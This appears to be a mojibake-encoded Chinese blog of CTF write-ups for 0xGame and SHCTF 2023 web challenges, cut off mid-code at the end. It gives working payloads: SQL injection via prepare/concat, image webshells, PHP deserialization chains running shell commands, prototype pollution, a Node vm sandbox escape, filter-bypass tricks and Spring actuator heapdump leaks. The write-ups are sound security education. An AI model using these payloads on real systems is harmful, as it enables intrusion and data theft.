å…¶å†…å®¹ä¸ºå¾…æ‰§è¡Œçš„ SQL è¯­å¥ ç„¶åä½¿ç”¨ prepare + execute æ¥æ‰§è¡Œè¯¥ SQL è¯­å¥ (ä½ å¯èƒ½éœ€è¦é€šè¿‡æŸäº›æ–¹æ³•å¯¹ SQL è¯­å¥è¿›è¡Œç¼–ç æˆ–è€…æ‹¼æ¥ä»¥ç»•è¿‡å…³é”®è¯æ£€æµ‹) ç„¶åé¢˜ç›®æºç å¦‚ä¸‹\nfrom flask import Flask, render_template, request\rimport MySQLdb\rimport re\rblacklist = [\u0026#39;select\u0026#39;, \u0026#39;update\u0026#39;, \u0026#39;insert\u0026#39;, \u0026#39;delete\u0026#39;, \u0026#39;database\u0026#39;, \u0026#39;table\u0026#39;, \u0026#39;column\u0026#39;, \u0026#39;alter\u0026#39;, \u0026#39;create\u0026#39;, \u0026#39;drop\u0026#39;, \u0026#39;and\u0026#39;, \u0026#39;or\u0026#39;, \u0026#39;xor\u0026#39;, \u0026#39;if\u0026#39;, \u0026#39;else\u0026#39;, \u0026#39;then\u0026#39;, \u0026#39;where\u0026#39;]\rconn = MySQLdb.connect(host=\u0026#39;db\u0026#39;, port=3306, user=\u0026#39;root\u0026#39;, passwd=\u0026#39;root\u0026#39;, db=\u0026#39;ctf\u0026#39;)\rapp = Flask(__name__)\r@app.route(\u0026#39;/\u0026#39;)\rdef index():\rfield = request.args.get(\u0026#39;order\u0026#39;, \u0026#39;id\u0026#39;)\rfield = re.sub(r\u0026#39;\\s+\u0026#39;, \u0026#39;\u0026#39;, field)\rfor s in blacklist:\rif s.lower() in field.lower():\rreturn s + \u0026#39; are banned\u0026#39;\rif not re.match(r\u0026#34;id|name|email\u0026#34;, field):\rfield = \u0026#39;id\u0026#39;\rwith conn.cursor() as cursor:\rcursor.execute(\u0026#39;SELECT * FROM userinfo order by %s\u0026#39; % field)\rres = cursor.fetchall()\rreturn render_template(\u0026#39;index.html\u0026#39;, res=res)\rif __name__ == \u0026#39;__main__\u0026#39;:\rapp.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000, debug=True) å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†selectã€tableã€ç­‰ï¼Œè¿˜å»æ‰äº†ç©ºæ ¼\nç»“åˆå‡ºé¢˜äººçš„hintï¼Œå¯çŸ¥è¦ä½¿ç”¨é¢„å¤„ç†çš„æ–¹æ³•æ¥æ‰§è¡Œsqlå‘½ä»¤\nè¿™ä¸¤ä¸ªåšå®¢è®²çš„å¾ˆè¯¦ç»†ï¼šSQLæ³¨å…¥è¿›é˜¶ä¹‹è·¯-é’ˆå¯¹å †å æ³¨å…¥çš„ç ”ç©¶ - mi2ac1e - åšå®¢å›­ (cnblogs.com)\nè®°å½•mysql å­˜å‚¨è¿‡ç¨‹ä¸­é€šè¿‡ä½¿ç”¨PREPAREã€EXECUTE é¢„å¤„ç†è¯­å¥å®ç°æ‰§è¡ŒåŠ¨æ€SQLè¯­å¥ - rhyswang - åšå®¢å›­ (cnblogs.com)\næ€»çš„æ¥è¯´é¢„å¤„ç†çš„æ­¥éª¤ğŸ‘‡\n#1 è®¾ç½®ç”¨æˆ·å˜é‡çš„å€¼\rset @code= ã€‚ã€‚ã€‚ã€‚ ;\r#2 é¢„å¤„ç†,å°†ç”¨æˆ·å˜é‡codeçš„å€¼èµ‹ç»™p\rprepare p from @code ;\r#3 æ‰§è¡Œé¢„å¤„ç†åçš„è¯­å¥\rexecute p; è¿™é‡Œç”±äºæœ‰é»‘åå•ï¼Œæˆ‘ä»¬å°±åªæœ‰é€šè¿‡concatæ¥è¿›è¡Œå­—ç¬¦ä¸²çš„æ‹¼æ¥\nç©ºæ ¼æœ‰/**/æ¥ç»•è¿‡\næ‰€ä»¥æœ€åçš„payloadğŸ‘‡\nset/**/@pr1=concat(\u0026#39;selec\u0026#39;,\u0026#39;t/**/fla\u0026#39;,\u0026#39;g/**/from/**/fl\u0026#39;,\u0026#39;ag\u0026#39;);\rprepare/**/p/**/from/**/@pr1;EXECUTE /**/p; ez_upload #\rhintğŸ‘‡\nHint 1: Docker ç¯å¢ƒ: php:7.4-apache\rHint 2: ä»£ç ä¸­çš„ imagecreatefromXXX å’Œ imageXXX å‡½æ•°æ¥æºäº PHP çš„ GD åº“\rHint 3: GD åº“ä¼šå¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“\rHint 4: å¦‚æœä¸Šä¼ æ­£ç¡®çš„å›¾ç‰‡é©¬åå‡ºç°æŠ¥é”™è¯·å°† BurpSuite è®¾ç½®ä¸­çš„ Character Sets æ”¹å› Recognize automatically based on message headers (ä¾‹å¦‚ https://blog.csdn.net/weixin_44937683/article/details/127516562 è¿™ç¯‡æ–‡ç« å°±æ˜¯ä¸ªé”™è¯¯ç¤ºèŒƒ éœ€è¦æŠŠ Character Sets æ”¹å›å»)\rHint 5: ä½ éœ€è¦åœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸€äº›é’ˆå¯¹ gif/png/jpg æ ¼å¼çš„äºŒæ¬¡æ¸²æŸ“ç»•è¿‡è„šæœ¬ å¦å¤–æ³¨æ„ä»£ç å¹¶æ²¡æœ‰é™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„åç¼€ é‚£å°±æ˜¯ç»å…¸çš„äºŒæ¬¡æ¸²æŸ“äº†\näºŒæ¬¡æ¸²æŸ“ä¼šä¿®æ”¹å›¾ç‰‡æºç ä¸­çš„éƒ¨åˆ†ä»£ç ï¼Œåªå…ˆä¸Šä¼ å†ä¸‹è½½å›¾ç‰‡ï¼Œä¸åŸå›¾ç‰‡çš„ä»£ç å¯¹æ¯”ï¼Œåœ¨æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„éƒ¨åˆ†å†™å…¥phpä»£ç å³å¯ã€‚\nè¿™ç§äºŒæ¬¡æ¸²æŸ“çš„é¢˜ï¼Œæœ€å¥½è¿˜æ˜¯ç”¨gifçš„å›¾ç‰‡æ¥åšï¼Œæ¯”è¾ƒç¨³å®šï¼Œå…¶ä»–çš„jpgã€pngå¾ˆå®¹æ˜“å¤±è´¥ï¼Œä¸‹é¢è¿™å¼ å›¾å°±æ˜¯æˆ‘ç”¨çš„ï¼Œæºç æ¯”è¾ƒçŸ­ã€‚\nå¯ä»¥çœ‹åˆ°ä¸Šä¼ å‰ğŸ‘‡\nä¸‹é¢æ˜¯ä¸Šä¼ åçš„ï¼Œæˆ‘åœ¨ä¸å˜çš„åŒºåŸŸåŠ å…¥äº†phpä»£ç \nç”±äºæ²¡æœ‰é™åˆ¶åç¼€ï¼Œåªéœ€è¦æŠ“åŒ…æŠŠcontent-typeä¿®æ”¹ä¸ºimage/gifï¼Œç„¶åæ–‡ä»¶åä¿®æ”¹ä¸º1.phpå³å¯ä¸Šä¼ \nez_unserialize #\rhintğŸ‘‡\nHint 1: Docker ç¯å¢ƒ: php:7.4-apache\rHint 2: ä½ å¯ä»¥é€šè¿‡ PHP çš„å¼•ç”¨æ¥ç»•è¿‡ __wakeup (https://www.php.net/manual/zh/language.references.php)\rHint 3: å°è¯•å°† Cache çš„ expired å­—æ®µçš„å¼•ç”¨èµ‹å€¼ç»™å¦å¤–ä¸€ä¸ªå˜é‡\rHint 4: è°ƒç”¨é“¾: DataObject.__destruct() -\u0026gt; Storage.__set() -\u0026gt; Cache.expired() -\u0026gt; Helper.__call()\rHint 5: å°è¯•å‘ DataObject ä¸­æ”¾å…¥ cache1 å’Œ cache2 å¹¶ä½¿å¾— $storage-\u0026gt;store = \u0026amp;$cache2-\u0026gt;expired æœ€ç»ˆé€šè¿‡è°ƒç”¨ cache2 çš„ expired æ–¹æ³•å®ç° RCE ç”±äºæºä»£ç æ¯”è¾ƒé•¿ï¼Œå‡ºé¢˜äººç»™äº†å¾ˆå¤šhint\næºä»£ç ğŸ‘‡\n\u0026lt;?php\rshow_source(__FILE__);\rclass Cache {\rpublic $key;\rpublic $value;\rpublic $expired;\rpublic $helper;\rpublic function __construct($key, $value, $helper) {\r$this-\u0026gt;key = $key;\r$this-\u0026gt;value = $value;\r$this-\u0026gt;helper = $helper;\r$this-\u0026gt;expired = False;\r}\rpublic function __wakeup() {\r$this-\u0026gt;expired = False;\r}\rpublic function expired() {\rif ($this-\u0026gt;expired) {\r$this-\u0026gt;helper-\u0026gt;clean($this-\u0026gt;key);\rreturn True;\r} else {\rreturn False;\r}\r}\r}\rclass Storage {\rpublic $store;\rpublic function __construct() {\r$this-\u0026gt;store = array();\r}\rpublic function __set($name, $value) {\rif (!$this-\u0026gt;store) {\r$this-\u0026gt;store = array();\r}\rif (!$value-\u0026gt;expired()) {\r$this-\u0026gt;store[$name] = $value;\r}\r}\rpublic function __get($name) {\rreturn $this-\u0026gt;data[$name];\r}\r}\rclass Helper {\rpublic $funcs;\rpublic function __construct($funcs) {\r$this-\u0026gt;funcs = $funcs;\r}\rpublic function __call($name, $args) {\r$this-\u0026gt;funcs[$name](...$args);\r}\r}\rclass DataObject {\rpublic $storage;\rpublic $data;\rpublic function __destruct() {\rforeach ($this-\u0026gt;data as $key =\u0026gt; $value) {\r$this-\u0026gt;storage-\u0026gt;$key = $value;\r}\r}\r}\rif (isset($_GET[\u0026#39;u\u0026#39;])) {\runserialize($_GET[\u0026#39;u\u0026#39;]);\r}\r?\u0026gt; åœ¨hinté‡Œé¢å·²ç»ç»™å‡ºpopé“¾æ¡äº†ï¼Œè¿™é‡Œå°±ä¸å†åˆ†æäº†ï¼Œå°±åªæ˜¯å¯¹å‡ ä¸ªå‡½æ•°çš„åˆ©ç”¨è®²ä¸€ä¸‹\né¦–å…ˆæ˜¯destructå‡½æ•°é‡Œé¢çš„foreachï¼Œæ˜¯éå†ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åæ•°ç»„é‡Œé¢åº”è¯¥æ˜¯ä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨\nç„¶åè¿›å…¥Storageç±»é‡Œçš„seté­”æœ¯æ–¹æ³•ï¼Œé‡Œé¢æœ‰æ‰§è¡Œvalueå‚æ•°çš„expiredå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªvalueå‚æ•°å°±åº”è¯¥æ˜¯cache2\ncacheç±»é‡Œæœ‰wakeupæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡å…¶ä»–å±æ€§å¼•ç”¨expiredçš„åœ°å€ï¼Œç„¶åä¿®æ”¹è¯¥å±æ€§çš„å€¼å³å¯ç»•è¿‡\næœ€åæ³¨æ„ï¼š$this-\u0026gt;helper-\u0026gt;clean($this-\u0026gt;key); è¿™ä¸ªè·³å…¥Helperç±»é‡Œçš„æ—¶å€™ä¼ å…¥çš„nameæ˜¯cleanï¼Œargsæ˜¯keyï¼Œéœ€è¦åœ¨helperç±»é‡Œçš„funcsä¹Ÿè®¾ç½®ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå­˜æœ‰é”®åä¸ºcleançš„é”®å€¼å¯¹\næœ€ç»ˆç”ŸæˆpaylaodğŸ‘‡\n$cache1=new Cache();\r$cache2=new Cache();\r$storage=new Storage();\r$helper=new Helper();\r$dataobject=new DataObject();\r$dataobject-\u0026gt;storage=$storage;\r$storage-\u0026gt;store=\u0026amp;$cache2-\u0026gt;expired;\r$dataobject-\u0026gt;data=[\u0026#39;1\u0026#39;=\u0026gt;$cache1,\u0026#39;2\u0026#39;=\u0026gt;$cache2];\r$helper-\u0026gt;funcs=[\u0026#39;clean\u0026#39;=\u0026gt;\u0026#39;passthru\u0026#39;];\r$cache2-\u0026gt;value=\u0026amp;$cache2-\u0026gt;expired;\r$cache2-\u0026gt;value=True;\r$cache2-\u0026gt;helper=$helper;\r$cache2-\u0026gt;key=\u0026#39;cat /proc/self/environ\u0026#39;;\recho serialize($dataobject).PHP_EOL; flagåœ¨ç¯å¢ƒå˜é‡é‡Œ\nez_sandbox #\rhintğŸ‘‡\nHint 1: åŸå‹é“¾æ±¡æŸ“ (é™¤äº† __proto__ è¿˜æœ‰å…¶å®ƒæ–¹æ³•)\rHint 2: vm æ²™ç®±é€ƒé€¸ (arguments.callee.caller)\rHint 3: åœ¨æ²™ç®±å†…å¯ä»¥é€šè¿‡ throw æ¥æŠ›å‡ºä¸€ä¸ªå¯¹è±¡ è¿™ä¸ªå¯¹è±¡ä¼šè¢«æ²™ç®±å¤–çš„ catch è¯­å¥æ•è· ç„¶åä¼šè®¿é—®å®ƒçš„ message å±æ€§ (å³ e.message)\rHint 4: é€šè¿‡ JavaScript çš„ Proxy ç±»æˆ–å¯¹è±¡çš„ __defineGetter__ æ–¹æ³•æ¥è®¾ç½®ä¸€ä¸ª getter ä½¿å¾—åœ¨æ²™ç®±å¤–è®¿é—® e çš„ message å±æ€§ (å³ e.message) æ—¶èƒ½å¤Ÿè°ƒç”¨æŸä¸ªå‡½æ•°\rHint 5: é€šè¿‡ constructor.prototype ç»•è¿‡ __proto__ è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“\rHint 6: https://xz.aliyun.com/t/11859 ä¸€ä¸ªjsæ¡†æ¶çš„ç•Œé¢ï¼Œåœ¨æºç ä¸­å¯ä»¥çœ‹åˆ°protoæ˜¯è¢«è¿‡æ»¤æ‰äº†\nä¸è¿‡è¿™é“é¢˜ä½¿ç”¨æ±¡æŸ“çš„åœ°æ–¹ä¸åœ¨registerã€‚ã€‚ã€‚åœ¨è¿™é‡Œå›°äº†å¥½ä¹…\nåº”è¯¥æ˜¯å…ˆå»æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç„¶ååœ¨loginç•Œé¢è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œç”±äºprotoè¢«banäº†ï¼Œé‚£å°±åªæœ‰ä½¿ç”¨constructoræ¥è¿›è¡Œæ±¡æŸ“ï¼Œè¦å…ˆæ³¨å†Œä¸€ä¸ªtestç”¨æˆ·ï¼Œç„¶åå†åœ¨loginç•Œé¢æŠ“åŒ…ä¸Šä¼ ä¸‹é¢çš„jsonéƒ¨åˆ†\n{\r\u0026#34;username\u0026#34;: \u0026#34;test\u0026#34;,\r\u0026#34;password\u0026#34;: \u0026#34;test\u0026#34;,\r\u0026#34;constructor\u0026#34;: {\r\u0026#34;prototype\u0026#34;: {\r\u0026#34;test\u0026#34;: \u0026#34;123\u0026#34;\r}\r}\r} å†ç”¨æ±¡æŸ“çš„ç”¨æˆ·å¯†ç ç™»å½•è¿›å»ï¼Œå°±èƒ½ä»¥adminçš„èº«ä»½è¿›å»\næºä»£ç é‡Œè¿‡æ»¤æ‰äº†å¸¸è§çš„å‡½æ•°ï¼Œä½†æ˜¯jsæ˜¯å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼æ¥è·å¾—å‡½æ•°å\nå®˜æ–¹wpğŸ‘‡\n// method 1\rthrow new Proxy({}, { // Proxy å¯¹è±¡â½¤äºåˆ›å»ºå¯¹æŸâ¼€å¯¹è±¡çš„ä»£ç†, ä»¥å®ç°å±æ€§å’Œâ½…æ³•çš„æ‹¦æˆª\rget: function(){ // è®¿é—®è¿™ä¸ªå¯¹è±¡çš„ä»»æ„â¼€ä¸ªå±æ€§éƒ½ä¼šæ‰§â¾ get æŒ‡å‘çš„å‡½æ•°\rconst c = arguments.callee.caller\rconst p = (c[\u0026#39;constru\u0026#39;+\u0026#39;ctor\u0026#39;][\u0026#39;constru\u0026#39;+\u0026#39;ctor\u0026#39;](\u0026#39;return pro\u0026#39;+\u0026#39;cess\u0026#39;))()\rreturn p[\u0026#39;mainM\u0026#39;+\u0026#39;odule\u0026#39;][\u0026#39;requi\u0026#39;+\u0026#39;re\u0026#39;](\u0026#39;child_pr\u0026#39;+\u0026#39;ocess\u0026#39;)[\u0026#39;ex\u0026#39;+\u0026#39;ecSync\u0026#39;](\u0026#39;cat\r/flag\u0026#39;).toString();\r}\r})\r// method 2\rlet obj = {} // é’ˆå¯¹è¯¥å¯¹è±¡çš„ message å±æ€§å®šä¹‰â¼€ä¸ª getter, å½“è®¿é—® obj.message æ—¶ä¼šè°ƒâ½¤å¯¹åº”çš„å‡½æ•°\robj.__defineGetter__(\u0026#39;message\u0026#39;, function(){\rconst c = arguments.callee.caller\rconst p = (c[\u0026#39;constru\u0026#39;+\u0026#39;ctor\u0026#39;][\u0026#39;constru\u0026#39;+\u0026#39;ctor\u0026#39;](\u0026#39;return pro\u0026#39;+\u0026#39;cess\u0026#39;))()\rreturn p[\u0026#39;mainM\u0026#39;+\u0026#39;odule\u0026#39;][\u0026#39;requi\u0026#39;+\u0026#39;re\u0026#39;](\u0026#39;child_pr\u0026#39;+\u0026#39;ocess\u0026#39;)[\u0026#39;ex\u0026#39;+\u0026#39;ecSync\u0026#39;](\u0026#39;cat\r/flag\u0026#39;).toString();\r})\rthrow obj WEEK3 #\rGoShop #\rHint 1: æ³¨æ„ int64 ç±»å‹çš„èŒƒå›´ ä¸¤ä¸ª int 64 è¿›è¡Œè®¡ç®—çš„æ—¶å€™ä¼šä¸ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜?\rHint 2: æ•´æ•°æº¢å‡º int64çš„æœ€å¤§å€¼ï¼š9223372036854775807\nå…ˆé€ æˆæ•´æ•°æº¢å‡ºï¼Œä¹°äº†å¾ˆå¤šä¸ªæ©˜å­ï¼Œç„¶åæŠŠä»–ä»¬å–æ‰å†ä¹°flagå°±è¡Œäº†\nWEEK4 #\rspring #\rä¸€ä¸ªspringæ¡†æ¶çš„ç½‘ç«™ï¼Œè¿›å…¥urlåç»™å‡ºæç¤º\nç»è¿‡æœç´¢äº†è§£åˆ°è¿™æ˜¯ä¸€ä¸ªspringçš„æœªæˆæƒè®¿é—®æ¼æ´ï¼Œå¯ä»¥ä¿®æ”¹urlåé¢çš„è·¯ç”±æ¥è®¿é—®\né¦–å…ˆè®¿é—®/actuator/env è¯»å–ç¯å¢ƒä¿¡æ¯\nå¯ä»¥çœ‹åˆ°flagåœ¨passwordé‡Œï¼Œä½†æ˜¯è¢«åŠ å¯†äº†ï¼Œæ˜¯çœ‹ä¸åˆ°çš„ï¼Œç„¶åè®¿é—®/actuator/heapdumpè·¯ç”±\nheapdumpæ˜¯ä¸€ä¸ªå†…å­˜æ–‡ä»¶ï¼Œå°†å…¶ä¸‹è½½ä¸‹æ¥ï¼Œæ­£å¸¸æƒ…å†µæ˜¯æ— æ³•åˆ†æçš„ï¼Œéœ€è¦ä¸‹è½½ä¸€ä¸ªEclipse Memory Analyzeråˆ†æjavaçš„è½¯ä»¶æ‰èƒ½çœ‹åˆ°\nåœ¨app.passwordå¯¹åº”çš„valueéƒ¨åˆ†æ‰¾åˆ°flag\nç›¸å…³é“¾æ¥ï¼šspringboot actuatoræœªæˆæƒè®¿é—® - å®‰å…¨è¯¾-ä¿¡ä»° - åšå®¢å›­ (cnblogs.com)\nã€ç²¾é€‰ã€‘Springbootä¿¡æ¯æ³„éœ²ä»¥åŠheapdumpçš„åˆ©ç”¨_heapdumpæ¼æ´_æç™½ä½ å¥½çš„åšå®¢-CSDNåšå®¢\n","date":"2023-10-07","externalUrl":null,"permalink":"/posts/2023/10/0xgame-2023/","section":"Posts","summary":"","title":"0xGame 2023","type":"posts"},{"content":"\rå‰è¨€ #\rå†™å®Œweek1æ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå¾ˆåŸºç¡€\nä¹Ÿæ˜¯æ”¾å‡åœ¨å®¶ä¸æƒ³æ‰“æ¸¸æˆï¼Œæ‹¿è¿™ä¸ªæ¶ˆç£¨ä¸€ä¸‹æ—¶é—´\nWEEK1 #\rbabyRCE #\ré¢˜ç›®æºç \n\u0026lt;?php\r$rce = $_GET[\u0026#39;rce\u0026#39;];\rif (isset($rce)) {\rif (!preg_match(\u0026#34;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\\u0026gt;|\\\u0026lt;|\\\u0026#39;|\\\u0026#34;/i\u0026#34;, $rce)) {\rsystem($rce);\r}else {\recho \u0026#34;hhhhhhacker!!!\u0026#34;.\u0026#34;\\n\u0026#34;;\r}\r} else {\rhighlight_file(__FILE__);\r} è¿‡æ»¤äº†éƒ¨åˆ†å‘½ä»¤å’Œç‰¹æ®Šç¬¦å·\nä½†æ˜¯æ²¡æœ‰è¿‡æ»¤æ‰åæ–œæ ï¼ˆ \\ ï¼‰ï¼Œç©ºæ ¼æˆ‘ä»¬å¯ä»¥ç”¨$IFSæ¥ç»•è¿‡\nç„¶åæŸ¥çœ‹æ–‡ä»¶çš„å‘½ä»¤å‡ ä¹éƒ½è¢«ç¦äº†ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡åæ–œæ æ¥è¿æ¥å­—æ¯å½¢æˆå‘½ä»¤\nca\\t = cat ï¼Œ l\\s = ls #è¯¸å¦‚æ­¤ç±» å¦å¤–ç©ºæ ¼çš„ä¸€äº›ç»•è¿‡æ–¹å¼\n$IFS\r$IFS$1\r${IFS}\r$IFS$9\r\u0026lt; æ¯”å¦‚cat\u0026lt;a.tct:è¡¨ç¤ºcat a.txt\r\u0026lt;\u0026gt;\r{cat,flag.php} //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½ï¼Œéœ€è¦ç”¨{}æ‹¬èµ·æ¥\r%20\r%09 è¿™é‡Œå½“å‰ç›®å½•ä¸‹æœ‰ä¸€ä¸ªflag.phpï¼Œä½†æ˜¯ä¸æ­£ç¡®\næ­£ç¡®çš„åœ¨æ ¹ç›®å½•ä¸‹\næ‹¿åˆ°flag\n1zzphp #\r\u0026lt;?php error_reporting(0);\rhighlight_file(\u0026#39;./index.txt\u0026#39;);\rif(isset($_POST[\u0026#39;c_ode\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;num\u0026#39;]))\r{\r$code = (String)$_POST[\u0026#39;c_ode\u0026#39;];\r$num=$_GET[\u0026#39;num\u0026#39;];\rif(preg_match(\u0026#34;/[0-9]/\u0026#34;, $num))\r{\rdie(\u0026#34;no number!\u0026#34;);\r}\relseif(intval($num))\r{\rif(preg_match(\u0026#39;/.+?SHCTF/is\u0026#39;, $code))\r{\rdie(\u0026#39;no touch!\u0026#39;);\r}\rif(stripos($code,\u0026#39;2023SHCTF\u0026#39;) === FALSE)\r{\rdie(\u0026#39;what do you want\u0026#39;);\r}\recho $flag;\r}\r} preg_matchçš„ç»•è¿‡æ–¹å¼ä¸€èˆ¬æœ‰ï¼ˆæ•°ç»„ç»•è¿‡ã€æ¢è¡Œç»•è¿‡ã€å›æº¯æº¢å‡ºï¼‰\nåœ¨è¿™é‡Œnumå¯ä»¥é€šè¿‡æ•°ç»„ç»•è¿‡\nç„¶æ˜¯codeå°±ä¸è¡Œäº†ï¼Œå› ä¸ºcodeæ˜¯å¼ºåˆ¶è½¬æ¢ä¸ºstringç±»å‹äº†ï¼Œå¦‚æœä»¥æ•°ç»„çš„å½¢å¼ä¼ å…¥ï¼Œé‚£ä¹ˆcodeçš„å€¼å°†å˜ä¸ºArrayï¼Œè¿™ä¸ªå¯ä»¥è‡ªå·±åœ¨æœ¬åœ°æµ‹è¯•\nç„¶åæ³¨æ„preg_matchçš„åŒ¹é…æ–¹å¼æ˜¯isï¼Œiæ˜¯å¿½ç•¥å¤§å°å†™ï¼Œsæ˜¯å¿½ç•¥æ¢è¡Œç¬¦\né‚£ä¹ˆè¿™é‡Œå°±åªæœ‰å°è¯•å›æº¯æº¢å‡ºè¿™ä¸ªæ–¹æ³•äº†\nå…·ä½“çš„åœ¨Pç¥çš„åšå®¢é‡Œæœ‰ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°\né“¾æ¥ï¼šPHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶ | ç¦»åˆ«æ­Œ (leavesongs.com)\nå…·ä½“çš„æ“ä½œå°±æ˜¯åœ¨codeéƒ¨åˆ†ç”Ÿæˆè‡³å°‘1000000ï¼ˆä¸€ç™¾ä¸‡ï¼‰ä¸ªå­—ç¬¦ï¼Œè¿™æ˜¯preg_matchçš„æœ€å¤§æ·±åº¦ï¼Œè¶…è¿‡åˆ™ä¸åŒ¹é…\næœ€ç»ˆå¦‚å›¾ğŸ‘‡\nez_serialize #\ré¢˜ç›®æºç ğŸ‘‡\n\u0026lt;?php\rhighlight_file(__FILE__);\rclass A{\rpublic $var_1;\rpublic function __invoke(){\rinclude($this-\u0026gt;var_1);\r}\r}\rclass B{\rpublic $q;\rpublic function __wakeup()\r{\rif(preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;q)) {\recho \u0026#34;hacker\u0026#34;; }\r}\r}\rclass C{\rpublic $var;\rpublic $z;\rpublic function __toString(){\rreturn $this-\u0026gt;z-\u0026gt;var;\r}\r}\rclass D{\rpublic $p;\rpublic function __get($key){\r$function = $this-\u0026gt;p;\rreturn $function();\r} }\rif(isset($_GET[\u0026#39;payload\u0026#39;]))\r{\runserialize($_GET[\u0026#39;payload\u0026#39;]);\r}\r?\u0026gt; å¯ä»¥çœ‹åˆ°åœ¨Aç±»é‡Œæœ‰includeå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡includeæ¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿™å°±æ˜¯popé“¾çš„ç»ˆç‚¹\næ•´ç†ä¸€ä¸‹æ€è·¯å¯ä»¥çœ‹å‡º\næˆ‘ä»¬è¦å…ˆé€šè¿‡Bç±»çš„wakeupï¼Œæ‰§è¡Œpreg_matchå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šæŠŠB-\u0026gt;qä½œä¸ºå­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…ï¼Œç„¶åå°±è·³åˆ°Cç±»çš„toStringæ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¦returnä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§å€¼ï¼Œä»è€Œè§¦å‘Dç±»çš„__geté­”æœ¯æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šæŠŠpå±æ€§å½“ä½œå‡½æ•°è¿”å›ï¼Œè§¦å‘Aç±»çš„__invokeé­”æœ¯æ–¹æ³•ï¼Œæœ€ç»ˆè¿›å…¥include\nPOPé“¾æ¡ï¼šB:wakeup() -\u0026gt; C:toString() -\u0026gt; D:__get() -\u0026gt; A:__invoke -\u0026gt; include æœ€ç»ˆå¦‚ä½•è¯»å–æ–‡ä»¶ï¼Ÿè¿™é‡Œæ²¡æœ‰è¿‡æ»¤æ‰filterï¼Œå¯ä»¥ç”¨ä»–æ¥è¯»å–æ–‡ä»¶\næœ€ç»ˆpayloadï¼š\n\u0026lt;?php\rclass A{\rpublic $var_1;\r}\rclass B{\rpublic $q;\r}\rclass C{\rpublic $var;\rpublic $z;\r}\rclass D{\rpublic $p;\r}\r$b=new B();\r$c=new C();\r$b-\u0026gt;q=$c;\r$d=new D();\r$c-\u0026gt;z=$d;\r$a=new A();\r$d-\u0026gt;p=$a;\r$a-\u0026gt;var_1=\u0026#39;php://filter/convert.base64-encode/resource=flag.php\u0026#39;;\recho serialize($b); æ‹¿å»Base64è§£ç å³å¯\nç™»å½•å°±ç»™flag #\rç»è¿‡æµ‹è¯•ï¼Œä¸å­˜åœ¨sqlæ³¨å…¥ï¼Œåå°ä¹Ÿæ‰«ä¸å‡ºä¸œè¥¿æ¥\nåº”è¯¥æ˜¯å¯†ç çˆ†ç ´ï¼Œç”¨æˆ·åçŒœæµ‹æ˜¯admin\næŠ“ä¸ªåŒ…ï¼Œå‘åˆ°Intruderï¼Œä½¿ç”¨Sniperå•å‚æ•°æ¨¡å¼\nåœ¨Payloadsé‡Œé€‰æ‹©å¯†ç è¿™ä¸€æ ï¼Œç„¶åå¼€å§‹æ”»å‡»\nå¯ä»¥çœ‹åˆ°å½“å¯†ç æ˜¯passwordçš„æ—¶å€™è¿”å›é•¿åº¦å’ŒçŠ¶æ€ç éƒ½ä¸ä¸€æ ·\nå¯†ç åº”è¯¥å°±æ˜¯passwordï¼Œç™»å½•è¿›å»æ‹¿åˆ°flagğŸ‘‡\né£æœºå¤§æˆ˜ #\rä¸€ä¸ªé£æœºæ¸¸æˆ\nçœ‹çœ‹æºç å§ï¼Œè¿™ç§é¢˜ä¸€èˆ¬éƒ½åœ¨æºç é‡Œæ‰¾çªç ´å£\næœ‰ä¸€ä¸ªmain.jsæ–‡ä»¶ï¼Œè¿›å»çœ‹çœ‹ï¼Œåœ¨æœ€åæ‰¾åˆ°ä¸€ä¸ªflagå…³é”®è¯ï¼Œå¥½åƒæ˜¯è¦scoresè¦å¤§äº99999æ‰å¼¹å‡ºflag\nè¿™é‡Œå…¶å®æˆ‘ä»¬åªéœ€è¦æ‰“å¼€æµè§ˆå™¨çš„æ§åˆ¶å°ï¼Œå°†scoresçš„å€¼ä¿®æ”¹ä¸€ä¸‹å°±è¡Œäº†\nezphp #\ræºç å¦‚ä¸‹ğŸ‘‡\n\u0026lt;?php\rerror_reporting(0);\rif(isset($_GET[\u0026#39;code\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;pattern\u0026#39;]))\r{\r$pattern=$_POST[\u0026#39;pattern\u0026#39;];\rif(!preg_match(\u0026#34;/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\\.|\\`|read*|show|file|\\\u0026lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\\/| 